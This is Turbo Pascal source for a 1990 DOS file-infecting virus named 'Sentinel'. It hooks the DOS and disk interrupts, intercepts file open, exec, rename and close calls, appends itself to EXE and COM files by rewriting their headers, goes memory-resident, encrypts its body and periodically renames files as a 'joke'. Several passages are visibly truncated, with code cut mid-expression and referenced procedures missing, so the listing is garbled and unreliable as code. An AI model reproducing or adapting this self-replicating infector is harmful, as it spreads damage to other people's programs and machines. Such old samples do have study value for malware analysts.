{$A+,B-,D+,E-,F-,I-,L+,N-,O-,R-,S-,V-}
{$M 16384,0,655360}

program Sentinel;

const
    MaxLen      = $65;
    Open        = $3d;
    Rename      = $56;
    GetSetAttr  = $43;
    Create      = $3c;
    CreateNew   = $5b;
    Close       = $3e;
    ExecProg    = $4b;
    ExtOpenCreate   = $6c;
    Copyright   =

' You won''t hear me, but you''ll feel me... (c) 1990 by Sentinel.'+
' With thanks to Borland. ';

type
    FileHeaderType  = record
                case integer of
                0: (Signature       : word;
                ImageSizeRem        : word;
                Pages512        : word;
                RelItems        : word;
                HeaderSize16        : word;
                MinPar          : word;
                MaxPar          : word;
                StartSS         : word;
                StartSP         : word;
                ChkSum          : word;
                StartIP         : word;
                StartCS         : word);
                1: (JmpCode         : byte;
                JmpOfs          : word);
                          end;

    Registers   = record
                case integer of
                  0: (bp,es,ds,di,si,dx,cx,bx,ax,ip,cs,flags: word);
                  1: (bpl,bph,esl,esh,dsl,dsh,dil,dih,sil,
                  sih,dl,dh,cl,ch,bl,bh,al,ah: byte);
              end;

    FileNameType    = array[0..MaxLen] of char;

    CopyRightType   = array[1..Length(Copyright)] of char;

    BufferType  = record
                FileHeader  : FileHeaderType;
                Copyright   : CopyRightType;
                ChkSum  : word;
                GenNr   : word;
                MyReg   : registers;
                CritPtr : pointer;
                FileName    : FileNameType;
                FileHandle  : word;
              end;

    IntType = record
            case integer of
              13:(Bytes1    : array[1..15] of byte;
              HDiskPtr  : pointer;
              Bytes2    : byte;
              DiskPtr   : pointer;
              Bytes3    : byte;
              Old13Ptr  : pointer);
              21: (CodeBytes    : array[1..30] of byte;
               InstrCode    : word;
               Old21Ptr : pointer);
          end;

var
    Int21Ptr    : pointer absolute 0:$84;
    Int13Ptr    : pointer absolute 0:$4C;
    Int24Ptr    : pointer absolute 0:$90;
    Int40Ptr    : pointer absolute 0:$100;
    Int40Seg    : word absolute 0:$102;
    Int41Seg    : word absolute 0:$106;
    Int41SegHi  : byte absolute 0:$107;
    Int41SegLo  : byte absolute 0:$106;
var
    B       : ^BufferType;
const
    SentinelID  = byte('S');



procedure Buffer; forward;
procedure Install; forward;
procedure EnableInterrupts; inline($fb);
procedure DisableInterrupts; inline($fa);


function  ShiftRgt(Num: longint;Times: word): longint;
  inline($59/$58/$5a/$d1/$ea/$d1/$d8/$e2/$fa);


function  ShiftLft(Num: longint;Times: word): longint;
  inline($59/$58/$5a/$d1/$e0/$d1/$d2/$e2/$fa);


function MatchFunc(Func: word): boolean;
  inline($58/$80/$fc/$3d/$74/$27/$80/$fc/$56/$74/$22/$80/$fc/$43/$74/$1d/
     $80/$fc/$3c/$74/$18/$80/$fc/$5b/$74/$13/$80/$fc/$3e/$74/$e/$80/
     $fc/$4b/$74/9/$3d/0/$6c/$74/4/$33/$c0/$eb/2/$b0/1);


procedure Move(var Source, Dest; Count: word);
begin
  inline($1e/$c4/$7e/0/>0/$ea/>0/>0/$ea/>0/>0);
end;


procedure JmpTo21;
begin
  inline($5d/$83/$c4/2/$ea/>0/>0);
end;


procedure MsFunc(var Reg: registers);
begin
  inline($1e/$c5/$76/0/>0/$5d/
     $9c/$50/$53/$51/$52/$56/$57/$1e/6/$c5/$76/<>
                 Ofs(Buffer) - Ofs(Install) + SizeOf(FileHeaderType) + SizeOf(CopyRightType) + 2) and
                 (FileSize > 1000) and (SaveHeader^.MaxPar <> 0) then
                begin
                  with SaveHeader^ do
                    begin
                      StartCS := ShiftRgt(FileSize,4) - HeaderSize16;
                      StartIP := word(FileSize) mod $10 + Ofs(Install);
                      StartSS := StartCS;
                      StartSP := StartIP + Ofs(Buffer) - Ofs(Install) + SizeOf(BufferType) + $200;
                      Inc(FileSize,Ofs(Buffer) + SizeOf(FileHeaderType) + SizeOf(Copyright) + 2);
                      ImageSizeRem := word((FileSize - AbsAddr(HeaderSize16,0))) mod $200;
                      Pages512 := ShiftRgt(FileSize,9);
                      if word(FileSize) mod $200 <> 0 then Inc(Pages512);
                      PutIt;
                    end;
                end;
                end
              else
                begin
                  if (((FileHeader.JmpCode) <> $e9) or
                  (FileSize - FileHeader.JmpOfs - 3 <>
                   Ofs(Buffer) - Ofs(Install) + SizeOf(FileHeaderType) + SizeOf(Copyright) + 2)) and
                  (FileSize > 1000) and (FileSize <= $EA00) then
                begin
                  SaveHeader^.JmpCode := $e9;
                  SaveHeader^.JmpOfs := FileSize + Ofs(Install) - 3;
                  PutIt;
                end;
                end;
                        end;
              ah := $3e;
              MsFunc(MyReg);
                    end;
        end;
        end;
      if Odd(Attr) then
        begin
          MyReg.ax := $4301;
          MyReg.cx := Attr;
          MyReg.ds := Segm;
          MyReg.dx := Offs;
          MsFunc(MyReg);
        end;
    end;
      DisableInterrupts; Int13Ptr := IntProc^.Old13Ptr; Int24Ptr := CritPtr; EnableInterrupts;
    end;
end;


function MatchFile: boolean;
var
    Cnt : byte;
begin
  Cnt := $ff;
  repeat
    Inc(Cnt);
  until (Mem[ds:Offs+Cnt] = 0) or (Cnt > MaxLen);
  MatchFile := ((Cnt >= 1) and (Cnt <= MaxLen)) and MatchExt(Mem[ds:Offs+Cnt-4]);
end;


procedure BiteIt;
begin
  if MatchFile then
    begin
      Buff^.MyReg.ds := ds;
      Buff^.MyReg.dx := Offs;
      PasteIt;
    end;
  inline($83/$c4/4/$5d/$8b/$e5/$5d/$7/$1f/$5f/$5e/$5a/$59/$5b/$58);
  JmpTo21;
end;


procedure CatchIt;
begin
  MsFunc(UserReg);
  if Buff^.FileName[0] = #0 then
    begin
      Move(Mem[ds:Offs],Buff^.FileName,MaxLen);
      if MatchFile and not Odd(flags) then
    Buff^.FileHandle := ax
      else
    Buff^.FileName[0] := #0;
    end;
end;


begin
  EnableInterrupts;
  Buff := Ptr(CSeg,Ofs(Buffer));
  Offs := dx;
  case UserReg.ah of
    Open: if UserReg.al and 7 = 0 then
        BiteIt
      else
        CatchIt;
    Create: CatchIt;
    CreateNew: begin
         CatchIt;
         if Odd(flags) and (ax = 80) and MatchFile then
           begin
             Buff^.MyReg.ds := ds;
             Buff^.MyReg.dx := Offs;
             PasteIt;
           end;
           end;
    Close: begin
         MsFunc(UserReg);
         if (bx = Buff^.FileHandle) and (Buff^.FileName[0] <> #0) then
           begin
         Buff^.MyReg.ds := CSeg;
         Buff^.MyReg.dx := Ofs(Buff^.FileName);
         PasteIt;
         Buff^.FileName[0] := #0;
           end;
       end;
    ExecProg: BiteIt;
    Rename: BiteIt;
    GetSetAttr: if UserReg.al = SentinelID then
          begin
            ax := CSeg;
            flags := flags and $fffe;
          end
        else
          BiteIt;
    ExtOpenCreate: if ax = $6c00 then
             begin
               Offs := si;
               if UserReg.bl and 7 = 0 then
             BiteIt
               else
             CatchIt;
             end
           else
             goto Continue
  else
    begin
      Continue: inline($8b/$e5/$5d/$7/$1f/$5f/$5e/$5a/$59/$5b/$58);
      JmpTo21;
    end;
  end;
end;


procedure Install;
var
    Buff        : ^BufferType;
    Sg      : word;
    PrefSeg     : word;
    Base        : word;
    IntProc         : ^IntType;


function WrongFunc: boolean;
  inline($55/$b8/ MemLen);
  if Offs < MemLen then IntProc^.HDiskPtr := Ptr(Int41Seg,Offs);
end;


function Empty: boolean;
var
    Offs    : word;
begin
  Offs := 0;
  while (Mem[Sg:Offs] = Mem[CSeg:Offs+Base]) and (Offs < Ofs(Int13)) do Inc(Offs);
  Empty := Offs <> Ofs(Int13);
end;


function NormalFunc: boolean;
begin
  MsFunc(Buff^.MyReg);
  NormalFunc := not Odd(Buff^.MyReg.flags);
end;


function FreeSpace: boolean;
begin
  FreeSpace := False;
  if AbsAddr(CSeg,Base+Ofs(Buffer)+SizeOf(BufferType)) < AbsAddr(Buff^.MyReg.ds,0) then
    if ExeFile(Buff^.FileHeader.Signature) then
      FreeSpace := AbsAddr(Buff^.FileHeader.StartSS+PrefSeg+$10,Buff^.FileHeader.StartSP) < AbsAddr(Buff^.MyReg.ds,0)
    else
      FreeSpace := True;
end;


procedure Joke;
var
    EnvSg   : word;
    OrgCnt  : word;
    Cnt : word;
begin
  EnvSg := MemW[PrefSeg:$2c];
  OrgCnt := 0;
  while MemW[EnvSg:OrgCnt] <> 0 do Inc(OrgCnt);
  Inc(OrgCnt,4);
  Cnt := OrgCnt;
  Move(Mem[EnvSg:Cnt],Buff^.FileName,MaxLen);
  while Mem[EnvSg:Cnt] <> 0 do Inc(Cnt);
  MemL[EnvSg:Cnt-4] := longint($4d4f432e);
  DisableInterrupts; Int13Ptr := Ptr(CSeg,Ofs(Int13) + Base); EnableInterrupts;
  Ren(EnvSg,OrgCnt,Seg(Buff^.FileName),Ofs(Buff^.FileName));
  DisableInterrupts; Int13Ptr := IntProc^.Old13Ptr; EnableInterrupts;
end;


begin
  inline($8c/$5e/= $c8) and (Int41SegHi <= $f3)) and
           (Int41SegLo and $7f = 0) and
           (MemW[Int41Seg:0] = $aa55) then
          SearchInt13(Mem[Int41Seg:2]);
    end;
    end;
  if Buff^.GenNr mod $20 = 0 then Joke;
  if WrongFunc or Empty then
    begin
      IntProc := Ptr(CSeg,Base+Ofs(MsFunc));
      IntProc^.InstrCode := $cdfb;
      IntProc^.Old21Ptr := Ptr($9090,$9021);
      with Buff^.MyReg do
    begin
      ah := $49;
      es := PrefSeg;
      if NormalFunc then
        begin
          ah := $48;
          bx := $ffff;
          MsFunc(Buff^.MyReg);
          if bx > (Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2 then
        begin
          Dec(bx,(Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2);
          ds := es + bx;
          if FreeSpace then
            begin
              ah := $4a;
              if NormalFunc then
            begin
              bx := (Ofs(Buffer) + SizeOf(BufferType) + SizeOf(FileHeaderType)) shr 4 + 2;
              Dec(MemW[PrefSeg:2],bx);
              ah := $4a;
              es := ds + 1;
              Dec(bx);
              MsFunc(Buff^.MyReg);
              MemW[ds:1] := 8;
              Mem[PrefSeg-1:0] := $5a;
              Buff^.FileName[0] := #0;
              MemL[CSeg:Ofs(MsFunc)-8+Base] := MemL[0:$84];
              IntProc^.Old21Ptr := Int21Ptr;
              IntProc^.InstrCode := $9a9c;
              Move(Mem[CSeg:Base],Mem[es:0],Ofs(Buffer) + SizeOf(BufferType));
              DisableInterrupts; Int21Ptr := Ptr(es,Ofs(Int21)); EnableInterrupts;
            end;
                    end;
        end
          else
        begin
          ah := $4a;
          if not NormalFunc then
            begin
              ah := $4a;
              MsFunc(Buff^.MyReg);
            end;
        end;
        end;
    end;
    end;
  if ExeFile(Buff^.FileHeader.Signature) then
      inline($8e/$46/0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/
     >0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0/>0);

end;


procedure Quit;
begin
  inline($b8/0/0/$8e/$d8);
  Halt;
end;



begin
  B := @Buffer;
  if (Ofs(B^.ChkSum) - Ofs(B^)) mod 4 = 0 then
    begin
      B^.Copyright := CopyRight;
      with B^.FileHeader do
    begin
      StartSS := SSeg - PrefixSeg - $10;
      StartSp := SPtr - $1000;
      StartCS := CSeg - PrefixSeg - $10;
      StartIP := Ofs(Quit);
      Signature := $4d5a;
    end;
      B^.ChkSum := ChkNum(Ofs(Buffer),(SizeOf(CopyRightType) + SizeOf(FileHeaderType)) shr 1);
      Encrpt(Ofs(Buffer),$ffff);
      MemW[CSeg:Ofs(Quit) + 4] := DSeg;
      Inline($8e/$1e/PrefixSeg);
      Install;
    end
  else
    WriteLn('Parity error. ''Copyright'' length must be greater with ',
        4 - (Ofs(B^.ChkSum) - Ofs(B^)) mod 4,' byte(s).');
end.

